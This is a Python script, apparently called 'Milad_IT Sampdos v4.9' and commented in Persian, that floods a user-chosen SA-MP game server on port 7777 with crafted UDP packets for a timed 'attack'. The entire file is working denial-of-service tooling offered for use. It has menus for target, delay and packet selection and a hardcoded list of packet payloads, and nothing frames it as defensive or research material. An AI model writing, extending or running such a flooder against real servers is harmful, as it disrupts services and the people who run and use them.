import socket
import time
import asyncio
import sys
import random
from colorama import init, Fore

init()

print(Fore.RED)
print("Milad_IT Sampdos v4.9")
print("\n\033[1;37mWelcome to SAMPDOS\033[30m")
time.sleep(2)
print("Loading.......")

# دریافت آدرس هدف
input_string = input("Enter Your Target Host And Port: ")

target, port = input_string.split(':')
port = int(port)

if port != 7777:
    print("\033[1;31m This script only works with port 7777! \033[31m")
    sys.exit(1)

host = socket.gethostbyname(target)

times = 60  # مدت زمان حمله (ثانیه)

print("                      \u001b[35m Sent Attack   ")
print(Fore.BLUE)
print("              Address IP : {}:{}".format(host, port))
print(Fore.GREEN)
print("________________________________________________")
print(Fore.RED)
print("              Timer Attack : {}".format(times))
print("              Power Attack : Controlled Speed")
print("              Method Attack : Samp dos")
print(Fore.YELLOW)
print('                      Created By Milad_IT ')
print("\n")

# لیست پکت‌ها
packets = [
    (b'\x08\x1e\x77\xda', "Packet \x08\x1e\x77\xda"),
    (b'\x08\x1e\x99\xab', "Packet \x08\x1e\x99\xab"),
    (b'\x08\x1e\x65\xcd', "Packet \x08\x1e\x65\xcd"),
    (b'\x1e\x08\x7a\xf3', "Packet \x1e\x08\x7a\xf3"),
    (b'*\x1e\x3c\xd2', "Packet *\x1e\x3c\xd2"),
    (b'\x09\x1e\x00\x72\x34', "Packet \x09\x1e\x00\x72\x34"),
    (b'\x08\x1e\x02\xab\xcd', "Packet \x08\x1e\x02\xab\xcd"),
    (b'\x09\x1e\x7f\x56\x32', "Packet \x09\x1e\x7f\x56\x32"),
    (b'\x0a\x1e\x11\x99\xff', "Packet \x0a\x1e\x11\x99\xff"),
    (b'*\x1e*\x6a', "Packet *\x1e*\x6a"),
    (b'*\x1e*\x9d', "Packet *\x1e*\x9d"),
    (b'*\x1e*\xf3', "Packet *\x1e*\xf3"),
    (b'*\x1e*\x4b', "Packet *\x1e*\x4b"),
    (b'*\x1e*\xaa', "Packet *\x1e*\xaa"),
    (b'*\x1e*\x1c', "Packet *\x1e*\x1c"),
    (b'*\x1e*\xe8', "Packet *\x1e*\xe8"),
    (b'*\x1e*\x5d', "Packet *\x1e*\x5d"),
    (b'*\x1e*\xc2', "Packet *\x1e*\xc2"),
]


packets += [
    (b'\x08\x1e\x77\xda', "Packet \x08\x1e\x77\xda"),
    (b'a\x1ei', "Packet a\x1ei"),
    (b'a\x1ep\xc1zj\x05', "Packet a\x1ep\xc1zj\x05"),
    (b'a\x1ec', "Packet a\x1ec"),
    (b'a\x1er', "Packet a\x1er"),
    (b'a\x1ep\xf8{j\x05', "Packet a\x1ep\xf8{j\x05"),
    (b'a\x1ep\xd4\x81j\x05', "Packet a\x1ep\xd4\x81j\x05"),
    (b'a\x1ep\xf0\x89j\x05', "Packet a\x1ep\xf0\x89j\x05"),
    (b'a\x1ep\x98\x8dj\x05', "Packet a\x1ep\x98\x8dj\x05"),
    (b'a\x1ep\xfc\xcdj\x05', "Packet a\x1ep\xfc\xcdj\x05"),
    (b'a\x1ep\xd6\xd3j\x05', "Packet a\x1ep\xd6\xd3j\x05"),
    (b'a\x1ep\xb3\xd9j\x05', "Packet a\x1ep\xb3\xd9j\x05"),
    (b'a\x1ep\x8f\xdfj\x05', "Packet a\x1ep\x8f\xdfj\x05"),
    (b'a\x1epj\xe5j\x05', "Packet a\x1epj\xe5j\x05"),
    (b'a\x1epV\xebj\x05', "Packet a\x1epV\xebj\x05"),
    (b'a\x1ep$\xf1j\x05', "Packet a\x1ep$\xf1j\x05"),
    (b'a\x1ep\xff\xf6j\x05', "Packet a\x1ep\xff\xf6j\x05"),
    (b'a\x1ep\xeb\xfcj\x05', "Packet a\x1ep\xeb\xfcj\x05"),
    (b'a\x1ep\xc7\x02k\x05', "Packet a\x1ep\xc7\x02k\x05"),
    (b'a\x1ep\xa2\x08k\x05', "Packet a\x1ep\xa2\x08k\x05"),
    (b'a\x1ep\x8d\x0ek\x05', "Packet a\x1ep\x8d\x0ek\x05"),
    (b'a\x1epY\x14k\x05', "Packet a\x1epY\x14k\x05"),
    (b'a\x1ep6\x1ak\x05', "Packet a\x1ep6\x1ak\x05"),
    (b'a\x1ep\x10 k\x05', "Packet a\x1ep\x10 k\x05"),
    (b'a\x1ep\xef%k\x05', "Packet a\x1ep\xef%k\x05"),
    (b'a\x1ep\xca+k\x05', "Packet a\x1ep\xca+k\x05"),
    (b'a\x1ep\xb41k\x05', "Packet a\x1ep\xb41k\x05"),
    (b'a\x1ep\x817k\x05', "Packet a\x1ep\x817k\x05"),
]

# درخواست تأخیر از کاربر
delay = float(input("Enter delay between packets (in seconds, e.g., 0.5 for slower speed): ") or 0.5)

# درخواست از کاربر برای انتخاب پکت‌ها
print("Select packets to send (comma-separated list of packet numbers, or enter 0 for random selection of all):")
selected_packets = input("Enter packet numbers: ").split(',')

# اگر کاربر `0` وارد کند، تمام پکت‌ها ارسال خواهند شد
if selected_packets == ["0"]:
    print("[INFO] Sending all packets randomly.")
else:
    selected_packets = [int(i.strip()) - 1 for i in selected_packets if i.strip().isdigit()]
    packets = [packets[i] for i in selected_packets]

async def send_packet(packet, host, port, delay):
    """ ارسال پکت با تأخیر بین درخواست‌ها """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(packet[0], (host, port))
    print(f"[INFO] Sent: Packet {repr(packet[0])}")
    await asyncio.sleep(delay)  # تأخیر بین ارسال‌ها

async def sampdos(host, port, times, packets, delay):
    timeout = time.time() + float(times)
    while time.time() < timeout:
        packet = random.choice(packets)  # انتخاب تصادفی یک پکت
        await send_packet(packet, host, port, delay)

def start_attack(host, port, times, packets, delay):
    loop = asyncio.get_event_loop()
    loop.run_until_complete(sampdos(host, port, times, packets, delay))

start_attack(host, port, times, packets, delay)

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nProgram terminated by user.")
    sys.exit(0)
